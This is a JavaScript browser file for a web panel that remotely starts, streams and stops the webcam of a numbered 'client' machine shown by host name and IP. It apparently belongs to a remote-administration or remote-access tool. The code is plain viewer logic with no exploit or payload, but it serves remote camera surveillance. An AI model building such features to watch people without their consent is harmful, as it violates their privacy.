// language: JavaScript, file: public/js/webcam.js
const $ = (id) => document.getElementById(id);
const params = new URLSearchParams(location.search);
const clientId = Number(params.get('id'));
const hostName = params.get('host') || `client ${clientId}`;
const hostIp   = params.get('ip') || '';
$('target').textContent = `${hostName} @ ${hostIp}`;

let cfg = { camera: 0, width: 640, height: 480, quality: 55, fps: 12 };
let running = false;
let frames = 0;
let lastFps = Date.now();

const PRESETS = {
  low:  { width: 320,  height: 240, quality: 40, fps: 8  },
  med:  { width: 640,  height: 480, quality: 55, fps: 12 },
  high: { width: 1280, height: 720, quality: 70, fps: 15 },
};

const img = document.createElement('img');
img.draggable = false;
img.addEventListener('load', () => {
  $('dot').classList.add('on');
  frames++;
  const now = Date.now();
  if (now - lastFps >= 1000) {
    $('fps').textContent = `${frames} fps`;
    frames = 0; lastFps = now;
  }
});
img.addEventListener('error', () => $('dot').classList.remove('on'));

async function start() {
  const r = await fetch(`/api/clients/${clientId}/webcam/start`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(cfg),
  });
  if (!r.ok) { alert('webcam start failed'); return; }
  running = true;
  const stage = $('stage');
  stage.innerHTML = '';
  stage.appendChild(img);
  loop();
}

async function stop() {
  if (!running) return;
  running = false;
  try { await fetch(`/api/clients/${clientId}/webcam/stop`, { method: 'POST' }); } catch {}
}

async function loop() {
  while (running) {
    const t = Date.now();
    await new Promise((resolve) => {
      const tmp = new Image();
      tmp.onload = () => { img.src = tmp.src; resolve(); };
      tmp.onerror = () => resolve();
      tmp.src = `/api/clients/${clientId}/webcam?t=${t}`;
    });
    if (!running) break;
    await new Promise(r => setTimeout(r, 1000 / Math.max(cfg.fps, 1)));
  }
}

$('preset').addEventListener('change', async (e) => {
  Object.assign(cfg, PRESETS[e.target.value] || {});
  if (running) { await stop(); await new Promise(r => setTimeout(r, 250)); await start(); }
});

$('camera').addEventListener('change', async (e) => {
  cfg.camera = Number(e.target.value) || 0;
  if (running) { await stop(); await new Promise(r => setTimeout(r, 250)); await start(); }
});

$('stop').addEventListener('click', async () => { await stop(); window.close(); });

function beaconStop() {
  try { navigator.sendBeacon(`/api/clients/${clientId}/webcam/stop`, new Blob(['{}'], { type: 'application/json' })); } catch {}
  stop();
}
window.addEventListener('beforeunload', beaconStop);
window.addEventListener('pagehide', beaconStop);

{
  const sel = $('camera');
  sel.innerHTML = '';
  for (let i = 0; i < 4; i++) {
    const o = document.createElement('option');
    o.value = String(i);
    o.textContent = `#${i}`;
    sel.appendChild(o);
  }
}

start();